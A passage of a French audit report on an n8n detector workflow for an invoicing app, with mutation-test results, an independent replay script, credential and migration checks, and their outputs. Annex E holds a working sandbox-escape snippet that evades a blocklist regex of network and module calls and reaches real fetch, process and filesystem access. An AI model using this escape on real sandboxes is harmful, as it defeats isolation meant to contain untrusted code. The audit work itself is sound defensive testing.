JUGE VERT (trou)   D6 facture d’acompte (creer_facture) au niveau 3 en Signature dès 50 % d’acompte
                   OK
JUGE VERT (trou)   D4 niveau 3 en Studio quand la réponse est en mode « auto » (n° 6)
                   OK
juge rouge         D5 Studio niveau 3 sur le n° 9 (stock, CRM absent)
                     ✗ 9 Studio au seuil pile : niveau attendu 2, obtenu 3 |   ✗ bilan de l'essai n8n différent : 1:2:170000:0/1/1 2:2:410000:0/2/0 3:1:60000:0/1/0 4:2:230000:0/1/1 5:0:0:0/0/0 6:2:0:0/1/1 7:1:0:0/1/0 8:1:150000:0/0/1 9:2:0
JUGE VERT (trou)   E1 constat qui porte une adresse sous un nom neutre (destinataire)
                   OK
JUGE VERT (trou)   E2b constat qui porte un téléphone (tel)
                   OK
juge rouge         E2 bilan qui laisse passer la liste des constats
                     ✗ bilan n° 1 : champs inattendus (detail,detecteur,mode,montant_total_centimes,nombre,numero,par_niveau) |   ✗ bilan n° 2 : champs inattendus (detail,detecteur,mode,montant_total_centimes,nombre,numero,par_niveau) |   

21 mutant(s) sur 29 laissent le juge vert
```

### Annexe B — rejeu indépendant des détecteurs : code (`/tmp/audit-032-010/attaque/rejeu.mjs`)

```js
// 032-010 — rejeu indépendant des nœuds Code de l'export presti-detecteurs sur des cas FICTIFS de l'auditeur,
// comparés aux règles de l'app (lib/). Aucun réseau, aucune base. Identifiants inventés, aucun nom.
// Lancement (depuis le dépôt) :
//   node --experimental-strip-types --no-warnings --import ./scripts/ts-loader.mjs /tmp/audit-032-010/attaque/rejeu.mjs
import { readFileSync } from 'node:fs'
import vm from 'node:vm'
const DEPOT = '/home/usine/Documents/presti'
const { decider } = await import(DEPOT + '/lib/relancesImpayes.ts')
const { devisDepasse } = await import(DEPOT + '/lib/comptaTableau.ts')
const { decisionPilote, REGLAGES_PILOTE_DEFAUT, typePiloteDeOutil } = await import(DEPOT + '/lib/pilote/regles.ts')
const { propositions } = await import(DEPOT + '/lib/apresChantier.ts')
const { STATUTS_DEMANDE } = await import(DEPOT + '/lib/assistant/outils-actions.ts')

const WF = JSON.parse(readFileSync(DEPOT + '/.orchestre/preuves/032-003/presti-detecteurs.workflow.json', 'utf8'))
const codeDe = (nom) => WF.nodes.find((n) => n.name === nom).parameters.jsCode
const chaine = []
for (let c = 'Départ des constats'; c; c = WF.connections[c]?.main?.[0]?.[0]?.node) chaine.push(c)
const LECTURES = WF.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest').map((n) => n.name)

// Exécution dans un contexte vm vide (pas de fetch, pas de process) : seul ce qu'on passe existe.
function executer(code, sorties, entree, jour) {
  const items = (l) => (l ?? []).map((j) => ({ json: j }))
  const ctx = vm.createContext({
    $: (nom) => { if (!(nom in sorties)) throw new Error('nœud inconnu ' + nom); const it = items(sorties[nom]); return { all: () => it, first: () => it[0] } },
    $input: { all: () => items(entree), first: () => items(entree)[0] },
    $now: { setZone: () => ({ toISODate: () => jour }) },
    Intl, Date, Math, Number, Map, Set, Object, Array, JSON, String,
  })
  return vm.runInContext('(function(){' + code + '\n})()', ctx).map((i) => i.json)
}
// passage complet qui rend aussi les constats avec niveau
function constats(donnees, jour) {
  const sorties = { 'Contexte du passage': executer(codeDe('Contexte du passage'), {}, [{}], jour), 'Capacités des offres': executer(codeDe('Capacités des offres'), {}, [{}], jour) }
  for (const l of LECTURES) sorties[l] = donnees[l]?.length ? donnees[l] : [{}]
  let e = [{}]
  const par = {}
  for (const nom of chaine) { e = executer(codeDe(nom), sorties, e, jour); par[nom] = e }
  return { constats: par['Niveau proposé selon l offre'][0].constats, bilan: par['Bilan par détecteur'] }
}

const u = (n) => '00000000-0000-4000-8000-' + String(n).padStart(12, '0')
const A = u(1), B = u(2), E = u(3)
const COMPTES = [{ id: A, plan: 'studio' }, { id: B, plan: 'signature' }, { id: E, plan: 'entreprise' }]
const JOUR = '2026-11-10'
const j = (n) => { const d = new Date(JOUR + 'T12:00:00Z'); d.setUTCDate(d.getUTCDate() - n); return d.toISOString().slice(0, 10) }
const t = (n) => j(n) + 'T09:00:00+00:00'
const tarifs = [{ id: u(901), artisan_id: A, actif: true }, { id: u(902), artisan_id: B, actif: true }]
const lignes = []
const dire = (titre, attendu, obtenu, verdict) => lignes.push(`${verdict ? 'CONFORME ' : 'ÉCART    '} ${titre}\n          attendu : ${attendu}\n          obtenu  : ${obtenu}`)
const de = (r, n) => r.constats.filter((c) => c.numero === n)
const resume = (l) => l.length ? l.map((c) => `${c.cle} niv.${c.niveau}${c.montant_centimes != null ? ' ' + c.montant_centimes + 'c' : ''}`).join(' ; ') : '(rien)'

// ── Statuts des demandes ──
console.log('Statuts de demande dans l’app (lib/assistant/outils-actions.ts:42) :', STATUTS_DEMANDE.join(', '))
for (const statut of ['en_discussion', null]) {
  const r = constats({ 'Lire comptes': COMPTES, 'Lire tarifs': tarifs, 'Lire demandes': [{ id: u(300), artisan_id: A, statut, urgence: 'urgent', type_chantier: 'Plomberie', created_at: t(2) }] }, JOUR)
  dire(`n° 7 demande qualifiée « ${statut} », compte avec tarifs, sans devis`, 'un constat demande_sans_devis (demande ouverte)', resume(de(r, 7)), de(r, 7).length === 1)
  dire(`n° 6 demande « ${statut} » depuis 2 jours`, statut === 'en_discussion' ? 'un constat (le client a écrit, la balle est chez l’artisan : lib/canaux/rangement.ts:47-50)' : 'un constat (statut vide = non lue, lib/assistant/donnees.ts:197)', resume(de(r, 6)), de(r, 6).length === 1)
}
// ── n° 4 et n° 8 sur le même devis ──
{
  const r = constats({ 'Lire comptes': COMPTES, 'Lire devis': [{ id: u(200), artisan_id: B, statut: 'envoye', date_emission: j(8), validite_jours: 14, acompte_pct: 0, total_ttc: 1500, lead_id: null, accepte_le: null, envoye_le: t(8), created_at: t(8) }] }, JOUR)
  const l = [...de(r, 4), ...de(r, 8)]
  dire('n° 4 + n° 8, devis Signature envoyé il y a 8 j, validité 14 j', 'une seule relance proposée pour ce devis ce jour-là', resume(l), l.length <= 1)
  const tot = r.bilan.filter((b) => [4, 8].includes(b.numero)).reduce((s, b) => s + b.montant_total_centimes, 0)
  dire('bilan n° 4 + n° 8 : montant compté', '150000 centimes (un devis de 1 500 €)', `${tot} centimes`, tot === 150000)
}
// ── n° 2 + n° 3 sur le même devis ──
{
  const r = constats({ 'Lire comptes': COMPTES, 'Lire devis': [{ id: u(201), artisan_id: A, statut: 'accepte', date_emission: j(5), validite_jours: 90, acompte_pct: 30, total_ttc: 2000, lead_id: null, accepte_le: t(1), envoye_le: t(5), created_at: t(5) }] }, JOUR)
  const s = [...de(r, 2), ...de(r, 3)].reduce((x, c) => x + c.montant_centimes, 0)
  dire('n° 2 + n° 3, devis Studio accepté 2 000 € avec 30 % d’acompte, rien facturé', 'au plus 200000 centimes d’argent qui dort sur ce devis', `${resume([...de(r, 2), ...de(r, 3)])} → ${s} centimes`, s <= 200000)
}
// ── n° 1 face à decider (trop_tot) ──
{
  const f = { id: u(100), artisan_id: B, devis_id: null, statut: 'emise', date_echeance: j(13), total_ttc: 1000, avoir_de: null, payee_le: null, type_facture: 'standard' }
  const journal = [{ id: u(801), artisan_id: B, facture_id: u(100), rang: 1, statut: 'envoyee' }]
  const r = constats({ 'Lire comptes': COMPTES, 'Lire factures': [f], 'Lire relances impayes': journal, 'Lire reglages des relances': [{ artisan_id: B, actif: true, jours: [3, 10, 21] }] }, JOUR)
  const dApp = decider({ facture: { ...f, numero: 'F-1', client_nom: null, client_email: 'client@exemple.invalid' }, reglages: { actif: true, jours: [3, 10, 21], textes: {}, actif_depuis: null }, journal: [{ facture_id: u(100), rang: 1, jour: j(1), statut: 'envoyee' }], arretee: false, maintenant: new Date(JOUR + 'T06:45:00+01:00') })
  dire('n° 1, rang 1 parti HIER (rattrapage à J+12), aujourd’hui J+13', `lib/relancesImpayes.ts decider : ${JSON.stringify(dApp)}`, resume(de(r, 1)), de(r, 1).length === 0)
}
// ── n° 8 le dernier jour de validité ──
{
  const d = { id: u(202), artisan_id: B, statut: 'envoye', date_emission: j(30), validite_jours: 30, acompte_pct: 0, total_ttc: 900, lead_id: null, accepte_le: null, envoye_le: t(30), created_at: t(30) }
  const r = constats({ 'Lire comptes': COMPTES, 'Lire devis': [d] }, JOUR)
  dire('n° 8, devis au dernier jour de sa validité (30 j envoyé, 30 j de validité)', `encore valable (devisDepasse = ${devisDepasse(d, JOUR)}) : c’est le dernier jour pour relancer`, resume(de(r, 8)), de(r, 8).length === 1)
}
// ── n° 10 face à propositions (lib/apresChantier.ts) ──
{
  const c1 = { id: u(410), artisan_id: B, devis_id: null, statut: 'termine', date_fin_reelle: null, maj_le: t(3) }
  const c2 = { id: u(411), artisan_id: B, devis_id: null, statut: 'termine', date_fin_reelle: j(20), maj_le: t(20) }
  const r = constats({ 'Lire comptes': COMPTES, 'Lire chantiers': [c1, c2], 'Lire apres chantier': [{ artisan_id: B, avis: true }] }, JOUR)
  const app = propositions({ chantiers: [c1, c2].map((c) => ({ id: c.id, titre: null, statut: c.statut, date_fin_reelle: c.date_fin_reelle, client_nom: null })), reglages: { avis: true, entretien: false, texte_avis: null, texte_entretien: null, actif_depuis: j(30) + 'T00:00:00Z' }, existantes: new Set(), jour: JOUR })
  dire('n° 10, chantier terminé SANS date de fin réelle, modifié il y a 3 j', `app : ${app.some((p) => p.chantier_id === u(410)) ? 'proposé' : 'rien (finDe exige la date de fin réelle, lib/apresChantier.ts:132-133)'}`, resume(de(r, 10).filter((c) => c.objet.id === u(410))), de(r, 10).filter((c) => c.objet.id === u(410)).length === 0)
  dire('n° 10, chantier fini il y a 20 j, avis activé il y a 30 j, aucun rappel posé', `app : ${app.some((p) => p.chantier_id === u(411)) ? 'proposé (fenêtre = activation − 14 j, lib/apresChantier.ts:138-144)' : 'rien'}`, resume(de(r, 10).filter((c) => c.objet.id === u(411))), de(r, 10).filter((c) => c.objet.id === u(411)).length === 1)
}
// ── Niveau 3 face au pilote de l'app ──
{
  const d = { id: u(203), artisan_id: B, statut: 'envoye', date_emission: j(3), validite_jours: 90, acompte_pct: 0, total_ttc: 800, lead_id: null, accepte_le: null, envoye_le: t(3), created_at: t(3) }
  const r = constats({ 'Lire comptes': COMPTES, 'Lire devis': [d] }, JOUR)
  const pil = decisionPilote({ drapeau: true, plan: 'signature', reglages: REGLAGES_PILOTE_DEFAUT, type: typePiloteDeOutil('relancer_devis'), outil: 'relancer_devis', partiesDepuis24h: 0 })
  dire('n° 4, Signature, pilote jamais activé (réglage par défaut)', `lib/pilote/regles.ts decisionPilote : ${JSON.stringify(pil)} → la relance attend un clic (niveau 2)`, resume(de(r, 4)), de(r, 4)[0]?.niveau === 2)
}
// ── Fuseau : demande reçue à 00 h 30 heure de Paris (23 h 30 UTC la veille), passage le surlendemain à 6 h 45 ──
{
  const r = constats({ 'Lire comptes': COMPTES, 'Lire demandes': [{ id: u(301), artisan_id: A, statut: 'nouveau', urgence: null, type_chantier: null, created_at: '2026-11-08T23:30:00+00:00' }] }, JOUR)
  dire('n° 6, fuseau : reçue le 09/11 à 00 h 30 (Paris), passage du 10/11', '1 jour (jour de Paris), étape j1', resume(de(r, 6)), de(r, 6)[0]?.jours === 1)
  const r2 = constats({ 'Lire comptes': COMPTES, 'Lire demandes': [{ id: u(302), artisan_id: A, statut: 'nouveau', urgence: null, type_chantier: null, created_at: '2026-10-24T22:30:00+00:00' }] }, '2026-10-27')
  dire('n° 6, changement d’heure (25/10) : reçue le 25/10 à 00 h 30 (Paris), passage du 27/10', '2 jours, étape j1', resume(de(r2, 6)), de(r2, 6)[0]?.jours === 2)
}
// ── Demande morte depuis 200 jours ──
{
  const r = constats({ 'Lire comptes': COMPTES, 'Lire demandes': [{ id: u(303), artisan_id: B, statut: 'nouveau', urgence: null, type_chantier: null, created_at: t(200) }], 'Lire reglages de la plateforme': [{ artisan_id: B, mode_reponse: 'auto' }] }, JOUR)
  dire('n° 6, demande restée « nouveau » depuis 200 jours, Signature en mode auto', 'une borne haute (une demande de 200 j n’est plus « un client qui attend ») ; jamais un départ seul', resume(de(r, 6)), de(r, 6).length === 0)
}
// ── Mélange de comptes (données incohérentes) ──
{
  const r = constats({ 'Lire comptes': COMPTES, 'Lire devis': [{ id: u(204), artisan_id: A, statut: 'accepte', date_emission: j(5), validite_jours: 90, acompte_pct: 0, total_ttc: 2000, lead_id: null, accepte_le: t(1), envoye_le: t(5), created_at: t(5) }], 'Lire factures': [{ id: u(105), artisan_id: B, devis_id: u(204), statut: 'emise', date_echeance: j(-30), total_ttc: 500, avoir_de: null, payee_le: null, type_facture: 'acompte' }] }, JOUR)
  dire('n° 2, facture d’acompte du compte B rattachée au devis du compte A', 'le reste de A ne dépend que des factures de A : 200000 centimes', resume(de(r, 2)), de(r, 2)[0]?.montant_centimes === 200000)
}
console.log(lignes.join('\n'))
console.log(`\n${lignes.filter((l) => l.startsWith('ÉCART')).length} écart(s) sur ${lignes.length} cas`)
```

### Annexe B — sortie (`node --experimental-strip-types --no-warnings --import ./scripts/ts-loader.mjs /tmp/audit-032-010/attaque/rejeu.mjs`)

```text
Statuts de demande dans l’app (lib/assistant/outils-actions.ts:42) : nouveau, en_discussion, repondu, gagne, perdu
ÉCART     n° 7 demande qualifiée « en_discussion », compte avec tarifs, sans devis
          attendu : un constat demande_sans_devis (demande ouverte)
          obtenu  : (rien)
ÉCART     n° 6 demande « en_discussion » depuis 2 jours
          attendu : un constat (le client a écrit, la balle est chez l’artisan : lib/canaux/rangement.ts:47-50)
          obtenu  : (rien)
ÉCART     n° 7 demande qualifiée « null », compte avec tarifs, sans devis
          attendu : un constat demande_sans_devis (demande ouverte)
          obtenu  : (rien)
ÉCART     n° 6 demande « null » depuis 2 jours
          attendu : un constat (statut vide = non lue, lib/assistant/donnees.ts:197)
          obtenu  : (rien)
ÉCART     n° 4 + n° 8, devis Signature envoyé il y a 8 j, validité 14 j
          attendu : une seule relance proposée pour ce devis ce jour-là
          obtenu  : devis_sans_reponse:00000000-0000-4000-8000-000000000200:j7 niv.3 150000c ; devis_bientot_expire:00000000-0000-4000-8000-000000000200:expire niv.3 150000c
ÉCART     bilan n° 4 + n° 8 : montant compté
          attendu : 150000 centimes (un devis de 1 500 €)
          obtenu  : 300000 centimes
ÉCART     n° 2 + n° 3, devis Studio accepté 2 000 € avec 30 % d’acompte, rien facturé
          attendu : au plus 200000 centimes d’argent qui dort sur ce devis
          obtenu  : chantier_a_facturer:00000000-0000-4000-8000-000000000201:accepte niv.2 200000c ; devis_signe_sans_acompte:00000000-0000-4000-8000-000000000201:signe niv.2 60000c → 260000 centimes
ÉCART     n° 1, rang 1 parti HIER (rattrapage à J+12), aujourd’hui J+13
          attendu : lib/relancesImpayes.ts decider : {"action":"rien","raison":"trop_tot"}
          obtenu  : facture_echue:00000000-0000-4000-8000-000000000100:j10 niv.3 100000c
ÉCART     n° 8, devis au dernier jour de sa validité (30 j envoyé, 30 j de validité)
          attendu : encore valable (devisDepasse = false) : c’est le dernier jour pour relancer
          obtenu  : (rien)
ÉCART     n° 10, chantier terminé SANS date de fin réelle, modifié il y a 3 j
          attendu : app : rien (finDe exige la date de fin réelle, lib/apresChantier.ts:132-133)
          obtenu  : demande_avis:00000000-0000-4000-8000-000000000410:avis niv.2
ÉCART     n° 10, chantier fini il y a 20 j, avis activé il y a 30 j, aucun rappel posé
          attendu : app : proposé (fenêtre = activation − 14 j, lib/apresChantier.ts:138-144)
          obtenu  : (rien)
ÉCART     n° 4, Signature, pilote jamais activé (réglage par défaut)
          attendu : lib/pilote/regles.ts decisionPilote : {"auto":false,"motif":"inactif"} → la relance attend un clic (niveau 2)
          obtenu  : devis_sans_reponse:00000000-0000-4000-8000-000000000203:j3 niv.3 80000c
CONFORME  n° 6, fuseau : reçue le 09/11 à 00 h 30 (Paris), passage du 10/11
          attendu : 1 jour (jour de Paris), étape j1
          obtenu  : demande_sans_reponse:00000000-0000-4000-8000-000000000301:j1 niv.2
CONFORME  n° 6, changement d’heure (25/10) : reçue le 25/10 à 00 h 30 (Paris), passage du 27/10
          attendu : 2 jours, étape j1
          obtenu  : demande_sans_reponse:00000000-0000-4000-8000-000000000302:j1 niv.2
ÉCART     n° 6, demande restée « nouveau » depuis 200 jours, Signature en mode auto
          attendu : une borne haute (une demande de 200 j n’est plus « un client qui attend ») ; jamais un départ seul
          obtenu  : demande_sans_reponse:00000000-0000-4000-8000-000000000303:j3 niv.3
ÉCART     n° 2, facture d’acompte du compte B rattachée au devis du compte A
          attendu : le reste de A ne dépend que des factures de A : 200000 centimes
          obtenu  : chantier_a_facturer:00000000-0000-4000-8000-000000000204:accepte niv.2 150000c

14 écart(s) sur 16 cas
```

### Annexe C — identifiant « Supabase account » et preuve de connexion : code

```js
// 032-010 — l'identifiant « Supabase account » dans l'export (sans jamais lire de clé : l'export n'en porte pas).
import { readFileSync } from 'node:fs'
const WF = JSON.parse(readFileSync('/home/usine/Documents/presti/.orchestre/preuves/032-003/presti-detecteurs.workflow.json', 'utf8'))
const avec = WF.nodes.filter((n) => n.credentials)
const parId = {}
for (const n of avec) { const k = JSON.stringify(n.credentials); parId[k] = (parId[k] ?? []).concat(`${n.type.replace('n8n-nodes-base.', '')}`) }
for (const [k, v] of Object.entries(parId)) console.log(k, '→', v.length, 'nœuds :', [...new Set(v)].join(', '))
const texte = JSON.stringify(WF)
console.log('champ host / serviceRole / clé dans l’export :', /"host"|serviceRole|eyJ[A-Za-z0-9_-]{10,}|sb_secret_/.test(texte))
const urls = [...new Set(WF.nodes.filter((n) => n.parameters?.url).map((n) => new URL(n.parameters.url).host))]
console.log('hôtes écrits en dur dans les lectures HTTP :', urls.join(', '))
// Ce que « Preuve de connexion » fait de trois réponses possibles du nœud Supabase (alwaysOutputData : true).
const code = WF.nodes.find((n) => n.name === 'Preuve de connexion').parameters.jsCode
const essai = (titre, items) => { try { const r = new Function('$input', code)({ all: () => items.map((j) => ({ json: j })) }); console.log(titre, '→', JSON.stringify(r[0].json)) } catch (e) { console.log(titre, '→ ARRÊT :', e.message) } }
essai('page HTML découpée en clés 0,1,2… (exécution 319)', [Object.fromEntries([...'<!DOCTYPE html>'].map((c, i) => [i, c]))])
essai('hôte qui rend [] (table vide, ou autre projet sans ligne)', [{}])
essai('hôte d’un AUTRE projet Supabase qui a la même table', [{ artisan_id: '00000000-0000-4000-8000-000000000009', actif: true, prereglage: 'equilibre', maillons: {}, maj_le: null }])
```

### Annexe C — sortie

```text
{"supabaseApi":{"id":"dTewDK98MLrNckNG","name":"Supabase account"}} → 16 nœuds : supabase, httpRequest
champ host / serviceRole / clé dans l’export : false
hôtes écrits en dur dans les lectures HTTP : gorcdvmueakcncsmrouo.supabase.co
page HTML découpée en clés 0,1,2… (exécution 319) → ARRÊT : Lecture de connexion : la réponse n est pas une ligne de regles_automatisation (hôte de l identifiant Supabase mal réglé ?)
hôte qui rend [] (table vide, ou autre projet sans ligne) → {"connexion":"ok","lignes":0}
hôte d’un AUTRE projet Supabase qui a la même table → {"connexion":"ok","lignes":1}
```

### Annexe D — citations des colonnes : code (`bash /tmp/audit-032-010/attaque/citations.sh`, lancé dans `supabase/migrations/`)

```bash
# 032-010 — chaque colonne lue, à la ligne de migration que cite le brief (plans/011-cadrage-01-11/briefs/c4-n8n-detecteurs.md, tableau « Les colonnes permises »).
v() { f=$(ls ${1}_*.sql | grep -v _A_COLLER | head -1); l=$(sed -n "${2}p" "$f"); if echo "$l" | grep -qw "$3"; then echo "ok   $f:$2 $3"; else echo "ÉCART $f:$2 attendu $3 : $(echo "$l" | tr -s ' ' | cut -c1-90)"; fi; }
v 0001 5 id; v 0001 12 plan; v 0068 127 est_demo; v 0052 26 suppression_demandee_le
v 0006 11 id; v 0006 12 artisan_id; v 0006 13 devis_id; v 0006 17 statut; v 0006 19 date_echeance; v 0006 25 total_ttc; v 0041 20 avoir_de; v 0140 18 payee_le; v 0176 44 type_facture
v 0002 37 id; v 0002 38 artisan_id; v 0002 42 statut; v 0002 43 date_emission; v 0002 44 validite_jours; v 0002 46 acompte_pct; v 0002 50 total_ttc; v 0002 51 created_at; v 0033 3 lead_id; v 0033 4 accepte_le; v 0055 35 envoye_le
v 0010 7 id; v 0010 8 artisan_id; v 0010 10 statut; v 0010 11 created_at; v 0026 4 urgence; v 0026 5 type_chantier
v 0141 62 id; v 0141 63 artisan_id; v 0141 64 devis_id; v 0141 70 statut; v 0141 74 date_fin_reelle; v 0141 78 maj_le
v 0141 122 id; v 0141 123 artisan_id; v 0141 124 chantier_id; v 0141 125 materiau_id; v 0141 126 quantite; v 0141 128 statut
v 0040 8 id; v 0040 9 artisan_id; v 0040 19 seuil_alerte; v 0040 36 id; v 0040 37 materiau_id; v 0040 39 quantite
v 0158 30 id; v 0158 31 artisan_id; v 0158 36 statut; v 0158 40 chantier_id
v 0159 42 id; v 0159 43 facture_id; v 0159 44 artisan_id; v 0159 45 rang; v 0159 48 statut; v 0159 60 facture_id; v 0159 61 artisan_id; v 0159 62 raison; v 0159 65 reprise_le
v 0159 25 artisan_id; v 0159 26 actif; v 0159 27 jours; v 0032 5 artisan_id; v 0032 6 mode_reponse; v 0038 9 id; v 0038 10 artisan_id; v 0038 21 actif; v 0165 20 artisan_id; v 0165 21 avis
```

### Annexe D — sortie (71 lignes `ok`, 0 écart)

```text
ok   0001_artisans.sql:5 id
ok   0001_artisans.sql:12 plan
ok   0068_controle.sql:127 est_demo
ok   0052_parametres.sql:26 suppression_demandee_le
ok   0006_factures.sql:11 id
ok   0006_factures.sql:12 artisan_id
ok   0006_factures.sql:13 devis_id
ok   0006_factures.sql:17 statut
ok   0006_factures.sql:19 date_echeance
ok   0006_factures.sql:25 total_ttc
ok   0041_facturation_electronique.sql:20 avoir_de
ok   0140_compta_automatisations.sql:18 payee_le
ok   0176_types_devis_factures.sql:44 type_facture
ok   0002_devis.sql:37 id
ok   0002_devis.sql:38 artisan_id
ok   0002_devis.sql:42 statut
ok   0002_devis.sql:43 date_emission
ok   0002_devis.sql:44 validite_jours
ok   0002_devis.sql:46 acompte_pct
ok   0002_devis.sql:50 total_ttc
ok   0002_devis.sql:51 created_at
ok   0033_devis_conversation.sql:3 lead_id
ok   0033_devis_conversation.sql:4 accepte_le
ok   0055_verrou_credits_stripe.sql:35 envoye_le
ok   0010_hardening.sql:7 id
ok   0010_hardening.sql:8 artisan_id
ok   0010_hardening.sql:10 statut
ok   0010_hardening.sql:11 created_at
ok   0026_lead_qualif.sql:4 urgence
ok   0026_lead_qualif.sql:5 type_chantier
ok   0141_crm_atelier.sql:62 id
ok   0141_crm_atelier.sql:63 artisan_id
ok   0141_crm_atelier.sql:64 devis_id
ok   0141_crm_atelier.sql:70 statut
ok   0141_crm_atelier.sql:74 date_fin_reelle
ok   0141_crm_atelier.sql:78 maj_le
ok   0141_crm_atelier.sql:122 id
ok   0141_crm_atelier.sql:123 artisan_id
ok   0141_crm_atelier.sql:124 chantier_id
ok   0141_crm_atelier.sql:125 materiau_id
ok   0141_crm_atelier.sql:126 quantite
ok   0141_crm_atelier.sql:128 statut
ok   0040_inventaire.sql:8 id
ok   0040_inventaire.sql:9 artisan_id
ok   0040_inventaire.sql:19 seuil_alerte
ok   0040_inventaire.sql:36 id
ok   0040_inventaire.sql:37 materiau_id
ok   0040_inventaire.sql:39 quantite
ok   0158_crm_commandes_temps_reel.sql:30 id
ok   0158_crm_commandes_temps_reel.sql:31 artisan_id
ok   0158_crm_commandes_temps_reel.sql:36 statut
ok   0158_crm_commandes_temps_reel.sql:40 chantier_id
ok   0159_relances_impayes.sql:42 id
ok   0159_relances_impayes.sql:43 facture_id
ok   0159_relances_impayes.sql:44 artisan_id
ok   0159_relances_impayes.sql:45 rang
ok   0159_relances_impayes.sql:48 statut
ok   0159_relances_impayes.sql:60 facture_id
ok   0159_relances_impayes.sql:61 artisan_id
ok   0159_relances_impayes.sql:62 raison
ok   0159_relances_impayes.sql:65 reprise_le
ok   0159_relances_impayes.sql:25 artisan_id
ok   0159_relances_impayes.sql:26 actif
ok   0159_relances_impayes.sql:27 jours
ok   0032_plateforme_config.sql:5 artisan_id
ok   0032_plateforme_config.sql:6 mode_reponse
ok   0038_prix_artisan.sql:9 id
ok   0038_prix_artisan.sql:10 artisan_id
ok   0038_prix_artisan.sql:21 actif
ok   0165_crm_apres_chantier.sql:20 artisan_id
ok   0165_crm_apres_chantier.sql:21 avis
```

### Annexe E — évasion du bac à sable du rejeu : code

```js
// 032-010 — le bac à sable du rejeu (scripts/detecteurs-n8n-qa.mjs:188-191) masque des NOMS, pas des capacités.
// Reproduction à l'identique de sa construction ; le code « du nœud » ne fait AUCUN appel : il dit seulement ce qu'il atteint.
const interdit = (quoi) => () => { throw new Error(`${quoi} interdit dans un nœud Code`) }
const bloques = { fetch: interdit('fetch'), XMLHttpRequest: interdit('XMLHttpRequest'), WebSocket: interdit('WebSocket'), require: interdit('require'), process: undefined, globalThis: undefined }
const codeDuNoeud = "const g = Function('return this')(); return [{ json: { fetch_reel: typeof g['fe' + 'tch'], process_reel: typeof g['pro' + 'cess'], module_fs: typeof (g['pro' + 'cess'] && g['pro' + 'cess'].getBuiltinModule && g['pro' + 'cess'].getBuiltinModule('node:fs').writeFileSync) } }];"
const CODE_INTERDIT = /fetch\s*\(|httpRequest|\$http|require\s*\(|\bimport\s|axios|this\.helpers|helpers\.|getWorkflowStaticData|\$execution\.|XMLHttpRequest|WebSocket/
console.log('regex CODE_INTERDIT (juge l.52) voit le code :', CODE_INTERDIT.test(codeDuNoeud))
const f = new Function('$', '$input', '$now', ...Object.keys(bloques), codeDuNoeud)
console.log('ce que le code atteint pendant le rejeu :', JSON.stringify(f(null, null, null, ...Object.values(bloques))[0].json))
```

### Annexe E — sortie

```text
regex CODE_INTERDIT (juge l.52) voit le code : false
ce que le code atteint pendant le rejeu : {"fetch_reel":"function","process_reel":"object","module_fs":"function"}
```
